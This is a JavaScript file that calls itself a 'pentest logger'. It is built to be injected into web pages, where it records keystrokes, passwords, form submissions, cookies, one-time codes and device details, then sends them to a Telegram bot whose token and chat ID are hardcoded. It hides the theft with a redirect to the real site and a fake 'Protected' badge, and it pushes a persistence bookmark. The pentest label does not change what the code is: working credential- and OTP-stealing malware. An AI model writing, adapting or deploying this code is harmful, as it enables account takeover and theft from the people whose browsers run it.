// ultimate-pentest-logger.js - Deploy as: your-domain.com/logger.js
// Usage: <script src="https://your-domain.com/logger.js"></script>

class UltimatePentestLogger {
    constructor() {
        this.config = {
            botToken: ' 8335563143:AAHK7yHwv1A-gEjAKqhz1WdrXCvsoRJloCw',  // @BotFather
            chatId: '8255019946',     // @userinfobot
            sessionId: 'pentest_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9)
        };
        this.victim = {
            profile: {},
            credentials: {},
            keystrokes: [],
            otps: [],
            navigation: [],
            cookies: '',
            network: []
        };
        this.init();
    }

    async init() {
        await this.collectProfile();
        this.hookEverything();
        this.persist();
        this.sendStatus('connected');
        this.injectUI();
    }

    // FULL DEVICE PROFILE
    async collectProfile() {
        this.victim.profile = {
            ip: await this.getIP(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            cookies: document.cookie,
            localStorage: Object.keys(localStorage),
            sessionStorage: Object.keys(sessionStorage),
            referrer: document.referrer,
            currentUrl: window.location.href,
            sessionId: this.config.sessionId
        };
    }

    async getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return await (await fetch('http://ip-api.com/json/?fields=query')).then(r=>r.json()).then(d=>d.query);
        }
    }

    // HOOK EVERYTHING
    hookEverything() {
        // 1. KEYSTROKES + FORMS (Username/Password)
        document.addEventListener('input', (e) => this.captureInput(e));
        document.addEventListener('keydown', (e) => this.captureKeystroke(e));
        
        // 2. FORM SUBMITS
        document.addEventListener('submit', (e) => this.captureForm(e), true);
        
        // 3. OTP FIELDS (6-digit auto-detect)
        document.addEventListener('input', (e) => {
            if (e.target.value.length === 6 && /^\d{6}$/.test(e.target.value)) {
                this.captureOTP(e.target.value, e.target);
            }
        });
        
        // 4. NAVIGATION + URLS
        window.addEventListener('beforeunload', () => this.sendStatus('leaving'));
        const observer = new MutationObserver(() => this.captureNavigation());
        observer.observe(document.body, {childList: true, subtree: true});
        
        // 5. COOKIES
        this.victim.cookies = document.cookie;
        
        // 6. NETWORK REQUESTS (XHR/Fetch)
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const response = await originalFetch(...args);
            this.captureNetwork(args[0], response);
            return response;
        };
    }

    captureInput(e) {
        this.victim.keystrokes.push({
            field: e.target.name || e.target.id || e.target.placeholder?.substr(0,20) || 'unnamed',
            value: e.target.value?.substr(0,25) + (e.target.value.length > 25 ? '...' : ''),
            type: e.target.type,
            time: Date.now()
        });
    }

    captureKeystroke(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            this.victim.keystrokes.push({
                key: e.key,
                target: e.target.name || e.target.type,
                sensitive: e.target.type === 'password'
            });
        }
    }

    captureForm(e) {
        e.preventDefault();
        e.stopPropagation();
        
        const formData = new FormData(e.target);
        this.victim.credentials = {
            ...Object.fromEntries(formData),
            formAction: e.target.action,
            formId: e.target.id
        };
        
        // Trigger final exfil
        this.sendCompleteReport();
        
        // Stealth redirect to real site
        setTimeout(() => {
            const targetUrl = e.target.action || 'https://google.com';
            window.location.href = targetUrl;
        }, 800);
    }

    captureOTP(code, field) {
        this.victim.otps.push({
            code: code,
            field: field.name || field.id || field.placeholder,
            timestamp: new Date().toISOString(),
            likelyService: this.detectOTPService(field)
        });
        this.sendStatus(`OTP: ${code}`);
    }

    detectOTPService(field) {
        const text = (field.placeholder || field.name || '').toLowerCase();
        if (text.includes('spotify')) return 'Spotify';
        if (text.includes('netflix')) return 'Netflix';
        if (text.includes('bank')) return 'Banking';
        return 'Generic OTP';
    }

    captureNavigation() {
        this.victim.navigation.push({
            url: window.location.href,
            title: document.title,
            time: Date.now()
        });
    }

    captureNetwork(url, response) {
        this.victim.network.push({
            url: url,
            status: response.status,
            time: Date.now()
        });
    }

    // PERSISTENT BOOKMARK
    persist() {
        const bookmarkCode = btoa(unescape(encodeURIComponent(
            `javascript:(function(){ 
                var s=document.createElement('script');
                s.src='https://your-domain.com/ultimate-pentest-logger.js';
                document.head.appendChild(s);
            })()`
        )));
        
        if (confirm('Save Quick Access? (Pentest Persistence)')) {
            const a = document.createElement('a');
            a.href = `data:text/html;base64,${bookmarkCode}`;
            a.download = 'quick-login.html';
            a.click();
            this.sendStatus('bookmark_created');
        }
    }

    // UI INDICATOR
    injectUI() {
        const indicator = document.createElement('div');
        indicator.id = 'pentest-indicator';
        indicator.innerHTML = '🛡️ Protected';
        indicator.style.cssText = `
            position:fixed;top:15px;right:15px;
            background:linear-gradient(45deg,#00ff88,#00cc66);
            color:#000;padding:12px 20px;border-radius:25px;
            font-family:Arial,sans-serif;font-weight:bold;font-size:13px;
            box-shadow:0 8px 25px rgba(0,255,136,0.4);z-index:999999;
            animation:pulse 2s infinite;
        `;
        indicator.onmouseover = () => indicator.textContent = `Session: ${this.config.sessionId}`;
        document.body.appendChild(indicator);
        
        // CSS Animation
        const style = document.createElement('style');
        style.textContent = `@keyframes pulse{0%,100%{box-shadow:0 8px 25px rgba(0,255,136,0.4);}50%{box-shadow:0 8px 35px rgba(0,255,136,0.7);}}`;
        document.head.appendChild(style);
    }

    // TELEGRAM EXFIL
    async sendStatus(event, data = {}) {
        const payload = {
            session: this.config.sessionId,
            ip: this.victim.profile.ip,
            event: event,
            timestamp: new Date().toISOString(),
            ...data,
            ...this.victim.profile
        };

        try {
            await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.config.chatId,
                    text: `🎯 PENTEST CAPTURE\n\`\`\`json\n${JSON.stringify(payload, null, 2).slice(0, 3800)}\n\`\`\`\n[Truncated]`,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
        } catch(e) {}
    }

    async sendCompleteReport() {
        const fullReport = {
            ...this.victim,
            finalUrl: window.location.href,
            totalKeystrokes: this.victim.keystrokes.length,
            otpsCaptured: this.victim.otps.length
        };
        await this.sendStatus('COMPLETE_REPORT', fullReport);
    }
}

// AUTO DEPLOY ON LOAD
if (!window.pentestLogger) {
    window.pentestLogger = new UltimatePentestLogger();
}